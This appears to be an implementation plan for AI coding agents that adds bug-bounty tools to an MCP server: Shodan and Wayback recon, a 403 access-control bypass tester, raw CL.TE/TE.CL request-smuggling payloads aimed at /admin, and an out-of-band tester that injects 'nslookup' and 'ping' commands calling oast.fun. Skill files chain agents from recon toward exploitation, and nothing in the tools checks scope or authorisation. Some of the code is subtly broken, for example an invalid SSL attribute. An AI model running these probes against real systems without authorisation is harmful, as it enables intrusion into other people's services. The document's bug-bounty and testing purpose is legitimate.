# Cybersec Phase 1: Bug Bounty Expansion — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add 7 new MCP tools + 2 new skills for bug bounty hunting workflows.

**Architecture:** Pure Python tools (httpx/socket/stdlib) in `cyber_tools/`, registered via FastMCP in `server.py`. New skills in `skills/` with hard-gate, checklist, workflow chain.

**Tech Stack:** Python 3.12, httpx, FastMCP, socket, asyncio

---

### Task 1: `shodan_lookup` — Shodan API Search

**Files:**
- Create: `mcp/cyber_tools/shodan_lookup.py`

- [ ] **Write the tool**

```python
import httpx


async def shodan_lookup(query: str, api_key: str = "") -> dict:
    if not api_key:
        return {"query": query, "error": "Shodan API key not provided. Get one at https://account.shodan.io", "results": []}

    try:
        async with httpx.AsyncClient(timeout=30.0) as client:
            resp = await client.get(
                f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}",
            )
            if resp.status_code == 200:
                data = resp.json()
                matches = []
                for m in data.get("matches", [])[:20]:
                    matches.append({
                        "ip": m.get("ip_str"),
                        "port": m.get("port"),
                        "org": m.get("org"),
                        "hostnames": m.get("hostnames", []),
                        "product": m.get("product"),
                        "version": m.get("version"),
                        "cve": m.get("vulns", []),
                    })
                return {"query": query, "total": data.get("total", 0), "results": matches}
            return {"query": query, "error": f"Shodan API error: {resp.status_code}", "results": []}
    except Exception as e:
        return {"query": query, "error": str(e), "results": []}
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/shodan_lookup.py
git commit -m "feat: add shodan_lookup tool"
```

---

### Task 2: `wayback_urls` — Wayback Machine URL History

**Files:**
- Create: `mcp/cyber_tools/wayback_urls.py`

- [ ] **Write the tool**

```python
import httpx


async def wayback_urls(domain: str, limit: int = 100) -> dict:
    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            resp = await client.get(
                f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit={limit}&fl=timestamp,original,statuscode,contenttype",
            )
            if resp.status_code == 200:
                rows = resp.json()
                urls = []
                for row in rows[1:]:
                    urls.append({
                        "timestamp": row[0],
                        "url": row[1],
                        "status": row[2],
                        "content_type": row[3],
                    })
                return {"domain": domain, "total": len(urls), "urls": urls}
            return {"domain": domain, "error": f"Wayback API error: {resp.status_code}", "urls": []}
    except Exception as e:
        return {"domain": domain, "error": str(e), "urls": []}
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/wayback_urls.py
git commit -m "feat: add wayback_urls tool"
```

---

### Task 3: `bypass_403` — 403 Bypass Techniques

**Files:**
- Create: `mcp/cyber_tools/bypass_403.py`

- [ ] **Write the tool**

```python
import httpx
from urllib.parse import urlparse


async def bypass_403(target: str) -> dict:
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    techniques = []

    parsed = urlparse(target)
    path = parsed.path or "/"

    # Technique 1: Different headers
    header_tricks = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Original-URL": path, "X-Rewrite-URL": path},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
    ]

    # Technique 2: Path manipulation
    path_tricks = [
        f"/%2e{path}",
        f"/{path}/",
        f"/{path}..;/",
        f"/;/{path}",
        path.upper(),
        f"/./{path}",
        f"/*/{path}",
    ]

    results = []

    async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
        # Baseline
        try:
            resp = await client.get(target)
            baseline = resp.status_code
        except httpx.HTTPError:
            baseline = 403

        # Test header bypass
        for headers in header_tricks:
            try:
                resp = await client.get(target, headers=headers)
                if resp.status_code != baseline and resp.status_code < 400:
                    results.append({"technique": f"Header bypass: {headers}", "status": resp.status_code, "success": True})
                    break
            except httpx.HTTPError:
                continue

        # Test path bypass
        if not results:
            for trick in path_tricks:
                try:
                    resp = await client.get(f"{parsed.scheme}://{parsed.hostname}{trick}")
                    if resp.status_code != baseline and resp.status_code < 400:
                        results.append({"technique": f"Path bypass: {trick}", "status": resp.status_code, "success": True})
                        break
                except httpx.HTTPError:
                    continue

        # Test method bypass
        if not results:
            for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
                try:
                    resp = await client.request(method, target)
                    if resp.status_code != baseline and resp.status_code < 400:
                        results.append({"technique": f"Method bypass: {method}", "status": resp.status_code, "success": True})
                        break
                except httpx.HTTPError:
                    continue

    return {"target": target, "baseline_status": baseline, "bypasses": results, "bypass_found": len(results) > 0}
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/bypass_403.py
git commit -m "feat: add bypass_403 tool"
```

---

### Task 4: `smuggling_check` — HTTP Request Smuggling

**Files:**
- Create: `mcp/cyber_tools/smuggling_check.py`

- [ ] **Write the tool**

```python
import asyncio
import ssl


async def smuggling_check(target: str) -> dict:
    host = target.split(":")[0]
    port = 443 if target.startswith("https") else 80

    results = []

    # CL.TE smuggling
    cl_te_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 44\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )

    # TE.CL smuggling
    te_cl_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )

    for name, payload in [("CL.TE", cl_te_payload), ("TE.CL", te_cl_payload)]:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verified = False
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx if port == 443 else None), timeout=10)
            w.write(payload.encode())
            await w.drain()
            resp = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                    if not chunk: break
                    resp += chunk
            except asyncio.TimeoutError:
                pass
            w.close()
            text = resp.decode(errors="replace")
            if "HTTP/1.1 200" in text and "admin" in text.lower():
                results.append({"type": name, "vulnerable": True, "evidence": text[:200]})
            else:
                results.append({"type": name, "vulnerable": False})
        except Exception as e:
            results.append({"type": name, "vulnerable": False, "error": str(e)})

    return {"target": host, "port": port, "smuggling_vulnerable": any(r.get("vulnerable") for r in results), "tests": results}
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/smuggling_check.py
git commit -m "feat: add smuggling_check tool"
```

---

### Task 5: `gf_patterns` — Pattern Matching for URLs

**Files:**
- Create: `mcp/cyber_tools/gf_patterns.py`

- [ ] **Write the tool**

```python
import re


PATTERNS = {
    "debug": [r"debug", r"dev", r"test", r"staging", r"internal", r"beta"],
    "sensitive": [r"admin", r"config", r"backup", r"db_", r"password", r"secret", r"token", r"api_key"],
    "endpoints": [r"api/", r"v1/", r"v2/", r"graphql", r"swagger", r"openapi", r"rest"],
    "params": [r"file=", r"url=", r"redirect=", r"path=", r"page=", r"include=", r"load="],
    "files": [r"\.php", r"\.asp", r"\.jsp", r"\.xml", r"\.json", r"\.env", r"\.git", r"\.sql", r"\.bak", r"\.old"],
}


async def gf_patterns(urls: str) -> dict:
    url_list = [u.strip() for u in urls.split("\n") if u.strip()]
    results = {category: [] for category in PATTERNS}

    for url in url_list:
        for category, patterns in PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, url, re.IGNORECASE):
                    results[category].append(url)
                    break

    return {
        "total_urls_analyzed": len(url_list),
        "matches": {k: {"count": len(v), "urls": v[:20]} for k, v in results.items() if v},
        "total_matches": sum(len(v) for v in results.values()),
    }
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/gf_patterns.py
git commit -m "feat: add gf_patterns tool"
```

---

### Task 6: `oob_test` — Out-of-Band Interaction Testing

**Files:**
- Create: `mcp/cyber_tools/oob_test.py`

- [ ] **Write the tool**

```python
import httpx


OOB_SERVICES = {
    "burpcollaborator": "https://burpcollaborator.net",
    "interactsh": "https://oast.fun",
    "oastify": "https://oastify.com",
    "interactsh_pro": "https://oast.pro",
}


async def oob_test(target: str, payload: str = "") -> dict:
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    techniques = [
        {"name": "HTTP Header Injection", "payload": f"http://oast.fun/test"},
        {"name": "DNS Lookup", "payload": f"nslookup oast.fun"},
        {"name": "Ping", "payload": f"ping -c 1 oast.fun"},
    ]

    results = []
    for tech in techniques:
        use_payload = payload or tech["payload"]
        test_url = f"{target}?url={use_payload}"
        if "file=" in target or "url=" in target or "redirect=" in target:
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
                    resp = await client.get(test_url)
                    results.append({
                        "technique": tech["name"],
                        "test_url": test_url,
                        "status": resp.status_code,
                        "note": "Check OOB service for callback",
                    })
            except httpx.HTTPError:
                continue

    return {
        "target": target,
        "tests": results,
        "recommendation": "Check Burp Collaborator / interact.sh for outbound callbacks. "
        "If you see a callback, the target is vulnerable to blind SSRF or OOB-based injection.",
    }
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/oob_test.py
git commit -m "feat: add oob_test tool"
```

---

### Task 7: `nuclei_scan` — CLI Wrapper for Nuclei

**Files:**
- Create: `mcp/cyber_tools/nuclei_scan.py`

- [ ] **Write the tool**

```python
import asyncio


async def nuclei_scan(target: str, template: str = "", severity: str = "") -> dict:
    cmd = ["nuclei", "-u", target, "-json", "-silent"]
    if template:
        cmd.extend(["-t", template])
    if severity:
        cmd.extend(["-severity", severity])

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
        output = stdout.decode(errors="replace").strip()

        findings = []
        for line in output.split("\n"):
            if line.strip():
                try:
                    import json
                    findings.append(json.loads(line))
                except json.JSONDecodeError:
                    findings.append({"raw": line})

        return {"target": target, "findings": findings, "count": len(findings), "template": template or "all"}
    except FileNotFoundError:
        return {"target": target, "error": "nuclei not found. Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", "findings": []}
    except asyncio.TimeoutError:
        return {"target": target, "error": "nuclei scan timed out (120s)", "findings": []}
```

- [ ] **Commit**

```bash
git add mcp/cyber_tools/nuclei_scan.py
git commit -m "feat: add nuclei_scan tool"
```

---

### Task 8: Register All 7 Tools in `server.py`

**Files:**
- Modify: `mcp/server.py`

- [ ] **Add imports for 7 new tools**

```python
from cyber_tools.shodan_lookup import shodan_lookup as _shodan
from cyber_tools.wayback_urls import wayback_urls as _wayback
from cyber_tools.bypass_403 import bypass_403 as _bypass
from cyber_tools.smuggling_check import smuggling_check as _smuggling
from cyber_tools.gf_patterns import gf_patterns as _gf
from cyber_tools.oob_test import oob_test as _oob
from cyber_tools.nuclei_scan import nuclei_scan as _nuclei
```

- [ ] **Add 7 tool registrations before `if __name__`**

```python
@mcp.tool()
def shodan_lookup(query: str, api_key: str = "") -> str:
    """Search Shodan for exposed devices and services."""
    return json.dumps(_run(_shodan(query, api_key=api_key)), indent=2)

@mcp.tool()
def wayback_urls(domain: str, limit: int = 100) -> str:
    """Fetch URL history from Wayback Machine."""
    return json.dumps(_run(_wayback(domain, limit=limit)), indent=2)

@mcp.tool()
def bypass_403(target: str) -> str:
    """Test 403 bypass techniques (headers, path, method)."""
    return json.dumps(_run(_bypass(target)), indent=2)

@mcp.tool()
def smuggling_check(target: str) -> str:
    """Test for HTTP request smuggling (CL.TE, TE.CL)."""
    return json.dumps(_run(_smuggling(target)), indent=2)

@mcp.tool()
def gf_patterns(urls: str) -> str:
    """Find sensitive patterns in URLs (debug, api, files, params)."""
    return json.dumps(_run(_gf(urls)), indent=2)

@mcp.tool()
def oob_test(target: str, payload: str = "") -> str:
    """Test for blind OOB interaction (SSRF, RCE, template injection)."""
    return json.dumps(_run(_oob(target, payload=payload)), indent=2)

@mcp.tool()
def nuclei_scan(target: str, template: str = "", severity: str = "") -> str:
    """Template-based vulnerability scanner. Requires nuclei CLI."""
    return json.dumps(_run(_nuclei(target, template=template, severity=severity)), indent=2)
```

- [ ] **Commit**

```bash
git add mcp/server.py
git commit -m "feat: register 7 new bug bounty tools in MCP server"
```

---

### Task 9: Create `cybersec-osint` Skill

**Files:**
- Create: `skills/cybersec-osint/SKILL.md`

- [ ] **Write the skill**

```markdown
---
name: cybersec-osint
description: Use when user asks for advanced OSINT, shodan search, URL history, or deep reconnaissance
---

<HARD-GATE>
Do NOT skip OSINT phase — run shodan_lookup + wayback_urls before concluding recon.
OSINT findings feed into scanning and vulnerability assessment.
</HARD-GATE>

## OSINT & Advanced Recon Methodology

### Checklist

Create a TodoWrite for each item and complete in order:

1. **Shodan Search** — Call `shodan_lookup(target)` to find exposed devices, services, open ports, and CVEs
2. **URL History** — Call `wayback_urls(target)` to discover historical URLs, hidden endpoints, old versions
3. **Pattern Analysis** — If wayback returned URLs, call `gf_patterns(urls)` to find sensitive endpoints (admin, api, debug, config)
4. **Endpoint Discovery** — Run `dir_bruteforce(target)` + `api_fuzz(target)` for hidden paths
5. **Certificate Transparency** — Call `crt_search(target)` for historical certs and subdomains
6. **Google Dorking** — Call `dork_search("site:target.com")` + `dork_search("site:target.com filetype:pdf")`
7. **Compile Findings** — URL patterns, exposed services, interesting endpoints, potential attack surface

### Tools Available
`shodan_lookup`, `wayback_urls`, `gf_patterns`, `crt_search`, `dir_bruteforce`, `api_fuzz`, `dork_search`

### Output
OSINT report: exposed services, historical URLs, sensitive endpoints, leaked info, attack surface expansion.

### Next Skill
If scanning not yet done, load `cybersec-scanning`. If scanning done, load `cybersec-bugbounty`.
```

- [ ] **Commit**

```bash
git add skills/cybersec-osint/SKILL.md
git commit -m "feat: add cybersec-osint skill"
```

---

### Task 10: Create `cybersec-bugbounty` Skill

**Files:**
- Create: `skills/cybersec-bugbounty/SKILL.md`

- [ ] **Write the skill**

```markdown
---
name: cybersec-bugbounty
description: Use when user asks for bug bounty specific testing, nuclei scanning, 403 bypass, or request smuggling
---

<HARD-GATE>
Do NOT run active scanning (nuclei) without completing passive recon and web testing first.
Always start with non-intrusive checks before running nuclei with critical templates.
</HARD-GATE>

## Bug Bounty Hunting Methodology

### Checklist

Create a TodoWrite for each item and complete in order:

1. **Nuclei Scan** — Run `nuclei_scan(target, severity="critical")` for critical templates first, then expand
2. **403 Bypass** — If any endpoints return 403, call `bypass_403(url)` to test bypass techniques
3. **Request Smuggling** — Call `smuggling_check(target)` to test CL.TE and TE.CL smuggling
4. **OOB Testing** — Call `oob_test(target)` for blind SSRF, blind RCE, template injection
5. **CORS Misconfig** — Call `cors_check(target)` for CORS bypass opportunities
6. **Open Redirect** — Call `open_redirect(target)` for redirect chains (OAuth phishing)
7. **GraphQL Audit** — Call `graphql_introspect(target)` for introspection + batching attacks
8. **JWT Analysis** — If JWT tokens found, call `jwt_analyze(token)` for alg confusion, none alg, weak key
9. **Duplicate Check** — Cross-reference findings with known bug bounty reports

### Tools Available
`nuclei_scan`, `bypass_403`, `smuggling_check`, `oob_test`, `cors_check`, `open_redirect`, `graphql_introspect`, `jwt_analyze`, `dir_bruteforce`, `ffuf_fuzz`, `sqlmap_check`, `xsstrike_check`

### Output
Bug bounty report with: nuclei findings, bypass results, smuggling status, OOB callback info, and priority rankings based on bounty potential.

### Next Skill
When all checklist items complete, load `cybersec-report` skill for final report.
```

- [ ] **Commit**

```bash
git add skills/cybersec-bugbounty/SKILL.md
git commit -m "feat: add cybersec-bugbounty skill"
```

---

### Task 11: Update `using-cybersec` Bootstrap

**Files:**
- Modify: `skills/using-cybersec/SKILL.md`

- [ ] **Add 2 new skills to the skills table**

Replace the skills table to include `cybersec-osint` and `cybersec-bugbounty`:

```markdown
| Skill | Trigger Keywords |
|-------|-----------------|
| **cybersec-recon** | recon, enumerate, find subdomains, DNS, whois, gather info |
| **cybersec-osint** | osint, shodan, url history, wayback, advanced recon |
| **cybersec-scanning** | scan ports, detect services, fingerprint, probe |
| **cybersec-vulns** | vulnerabilities, CVEs, weaknesses, security issues |
| **cybersec-web** | web app test, SQLi, XSS, CMS, WordPress, API |
| **cybersec-bugbounty** | bug bounty, nuclei, 403 bypass, smuggling, dalfox |
| **cybersec-exploit** | exploit, PoC, get shell, metasploit, brute force |
| **cybersec-crisis** | incident, breach, emergency, compromised, hacked |
| **cybersec-report** | report, remediation, fix, document, summary |
```

Update workflow chain:
```markdown
## Workflow Chain

Standard pentest workflow: **Recon → OSINT → Scanning → Vulns → Web → Bug Bounty → Exploit → Report**

Each skill transitions to the next automatically when its checklist is complete.

For emergencies: **Crisis** is a parallel path (jump directly if breach reported).
```

- [ ] **Commit**

```bash
git add skills/using-cybersec/SKILL.md
git commit -m "feat: update bootstrap with osint and bugbounty skills"
```

---

### Task 12: Verify All 52 Tools

**Files:**
- No files to modify

- [ ] **Run MCP server and count tools**

```bash
echo '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' | ./mcp/.venv/bin/python3 -m server | head -1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f'Total tools: {len(d[\"result\"][\"tools\"])}')"
```

Expected: `Total tools: 52`

- [ ] **Final commit**

```bash
git commit --allow-empty -m "chore: verify 52 MCP tools registered"
git push
```
